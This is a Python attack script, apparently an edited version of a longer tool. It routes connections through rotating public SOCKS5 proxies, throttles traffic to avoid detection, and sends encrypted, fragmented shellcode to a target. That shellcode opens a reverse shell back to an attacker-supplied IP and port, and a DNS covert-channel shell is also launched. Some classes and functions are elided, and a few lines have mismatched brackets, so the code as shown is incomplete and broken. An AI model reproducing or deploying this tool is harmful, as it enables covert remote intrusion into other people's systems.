import socket
import struct
import threading
import time
import random
import re
import subprocess
import ssl
import sys
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# Command-line arguments
if len(sys.argv) != 5:
    print("Usage: python script.py <attacker_ip> <attacker_port> <target_ip> <target_port>")
    sys.exit(1)

ATTACKER_IP = sys.argv[1]
ATTACKER_PORT = int(sys.argv[2])
TARGET_IP = sys.argv[3]
TARGET_PORT = int(sys.argv[4])
MAX_THREADS = 8
TRAFFIC_THROTTLE = 50  # Kbps max

class ProxyPool:
    """Rotating public proxy pool for anonymity"""
    def __init__(self):
        self.proxies = []
        self.last_refresh = 0
        self.lock = threading.Lock()
        self.refresh_proxies()
        
    def refresh_proxies(self):
        """Fetch fresh public proxies from reliable sources"""
        new_proxies = []
        sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=5000&country=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt"
        ]
        
        for source in sources:
            try:
                response = subprocess.check_output(
                    ["curl", "-s", source],
                    timeout=10
                ).decode().splitlines()
                new_proxies.extend([line.strip() for line in response if ':' in line])
            except:
                pass
        
        # Validate proxies
        valid_proxies = []
        for proxy in random.sample(new_proxies, min(20, len(new_proxies))):
            if self.validate_proxy(proxy):
                valid_proxies.append(proxy)
        
        with self.lock:
            self.proxies = valid_proxies
            self.last_refresh = time.time()
            print(f"[*] Loaded {len(self.proxies)} valid proxies")
    
    def validate_proxy(self, proxy):
        """Check proxy functionality"""
        ip, port = proxy.split(':')
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(8)
            sock.connect((ip, int(port)))
            
            # SOCKS5 handshake
            sock.send(b"\x05\x01\x00")
            if sock.recv(2) != b"\x05\x00":
                return False
                
            # Test connection to Google DNS
            sock.send(b"\x05\x01\x00\x01" + socket.inet_aton("8.8.8.8") + struct.pack(">H", 53))
            response = sock.recv(10)
            return response.startswith(b"\x05\x00")
        except:
            return False
        finally:
            sock.close()
    
    def get_random_proxy(self):
        """Get random proxy with auto-refresh"""
        with self.lock:
            if not self.proxies or time.time() - self.last_refresh > 600:
                self.refresh_proxies()
            return random.choice(self.proxies) if self.proxies else None

class StealthNetwork:
    """Traffic shaping and proxy routing"""
    def __init__(self, proxy_pool):
        self.traffic_counter = 0
        self.last_reset = time.time()
        self.rate_lock = threading.Lock()
        self.proxy_pool = proxy_pool
        
    def create_connection(self, target, timeout=30):
        """Proxy-routed connection with traffic shaping"""
        proxy_str = self.proxy_pool.get_random_proxy()
        if not proxy_str:
            raise Exception("No valid proxies available")
            
        proxy_ip, proxy_port = proxy_str.split(':')
        proxy_port = int(proxy_port)
        
        # Connect to proxy
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((proxy_ip, proxy_port))
        
        # SOCKS5 handshake
        sock.send(b"\x05\x01\x00")
        sock.recv(2)  # Check response
        target_ip_encoded = socket.inet_aton(target[0])
        sock.send(b"\x05\x01\x00\x01" + target_ip_encoded + struct.pack(">H", target[1]))
        response = sock.recv(10)
        if not response.startswith(b"\x05\x00"):
            raise ConnectionError("Proxy connection failed")
        
        self._throttle_traffic(len(target_ip_encoded))
        return sock

    def send(self, sock, data):
        """Rate-limited data transmission"""
        chunk_size = 512
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            sock.send(chunk)
            self._throttle_traffic(len(chunk))
            time.sleep(random.uniform(0.01, 0.05))  # Random jitter

    def _throttle_traffic(self, size):
        """Enforce bandwidth limit (Kbps)"""
        with self.rate_lock:
            elapsed = time.time() - self.last_reset
            if elapsed > 1:
                self.traffic_counter = 0
                self.last_reset = time.time()
            
            self.traffic_counter += size * 8
            
            max_bits = TRAFFIC_THROTTLE * 1024
            if self.traffic_counter > max_bits:
                excess = (self.traffic_counter - max_bits) / max_bits
                time.sleep(excess * 0.8)

class EvasionEngine:
    """Advanced anti-detection and fingerprinting"""
    # ... (unchanged from original) ...

class ExploitCore:
    """Optimized exploitation with stealth enhancements"""
    def __init__(self, stealth, evasion, target_ip, target_port, attacker_ip, attacker_port):
        self.stealth = stealth
        self.evasion = evasion
        self.target_ip = target_ip
        self.target_port = target_port
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.stop_event = threading.Event()
        self.success = False
        
    def execute(self):
        """Stealth exploitation sequence"""
        try:
            # Establish connection via proxy
            conn = self.stealth.create_connection((self.target_ip, self.target_port), timeout=120)
            
            # Send spoofed handshake
            handshake = self.evasion.craft_handshake()
            self.stealth.send(conn, handshake)
            conn.recv(1024)  # Discard server banner
            
            # Prepare payload with encryption
            payload = self._generate_payload()
            encrypted_payload, key = self.evasion.encrypt_shellcode(payload)
            fragments = self.evasion.fragment_payload(encrypted_payload)
            
            # Phase 1: Send 85% of payload
            for frag in fragments[:int(len(fragments)*0.85]:
                if self.stop_event.is_set():
                    return False
                self.stealth.send(conn, frag)
                time.sleep(random.uniform(0.05, 0.2))
            
            # Wait with adaptive timing
            wait_time = 115 + random.uniform(-2, 2)
            start = time.time()
            while time.time() - start < wait_time:
                if self.stop_event.is_set():
                    return False
                time.sleep(0.25)
                
            # Phase 2: Send remaining payload + decryption stub
            for frag in fragments[int(len(fragments)*0.85:]:
                self.stealth.send(conn, frag)
            
            # Send decryption key
            key_packet = struct.pack("!I", 1) + b"\x14" + key
            self.stealth.send(conn, key_packet)
            
            # Trigger verification
            time.sleep(0.5)
            self.stealth.send(conn, b"\x01")
            return True
            
        except Exception as e:
            if "reset" in str(e).lower():
                self.success = True
            return False

    def _generate_payload(self):
        """Dynamic shellcode with current attacker details"""
        return (
            b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b"
            b"\x1b\x48\x8b\x1b\x48\x8b\x5b\x08\x48\x89\xdf\x48\x31\xc0\x99\x0f\x05\x48\x89\xc7\x52"
            b"\x68\x02\x00" + struct.pack(">H", self.attacker_port) +
            socket.inet_aton(self.attacker_ip) +
            b"\x48\x89\xe6\x6a\x10\x5a\x48\x89\xc0\x0f\x05\x85\xc0\x75\x2c\x48\x31\xc0\x48\xff\xc0"
            b"\x99\x48\x89\xe6\x52\x5f\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x48\x89\xe6\x48"
            b"\x31\xd2\x80\xc2\xff\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x31\xd2"
            b"\xb2\x08\x0f\x05\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x48\x31\xf6"
            b"\x48\x31\xd2\x48\xff\xc0\x0f\x05"
        )

# ... (monitor_success and dns_tunnel_shell functions remain unchanged) ...

if __name__ == "__main__":
    # Setup components
    proxy_pool = ProxyPool()
    stealth = StealthNetwork(proxy_pool)
    evasion = EvasionEngine()
    engine = ExploitCore(stealth, evasion, TARGET_IP, TARGET_PORT, ATTACKER_IP, ATTACKER_PORT)
    
    print(f"[*] Targeting {TARGET_IP}:{TARGET_PORT} with callback to {ATTACKER_IP}:{ATTACKER_PORT}")
    
    # Start DNS covert channel
    dns_thread = threading.Thread(target=dns_tunnel_shell, daemon=True)
    dns_thread.start()
    
    # Start monitoring
    monitor_thread = threading.Thread(target=monitor_success, args=(engine,))
    monitor_thread.start()
    
    # Controlled thread execution
    threads = []
    for _ in range(MAX_THREADS):
        if engine.stop_event.is_set():
            break
        t = threading.Thread(target=engine.execute)
        t.start()
        threads.append(t)
        time.sleep(random.uniform(1, 5))  # Staggered start
        
    # Progress monitoring
    start_time = time.time()
    while not engine.stop_event.is_set():
        elapsed = time.time() - start_time
        print(f"\r⌛ Elapsed: {int(elapsed//60)}m {int(elapsed%60)}s | Active: {sum(t.is_alive() for t in threads)}", end="")
        if elapsed > 1200:  # 20m timeout
            engine.stop_event.set()
        time.sleep(5)
    
    # Cleanup
    for t in threads:
        t.join(timeout=5)
        
    if engine.success:
        print("\n[+] Covert access established")
    else:
        print("\n[!] Operation completed")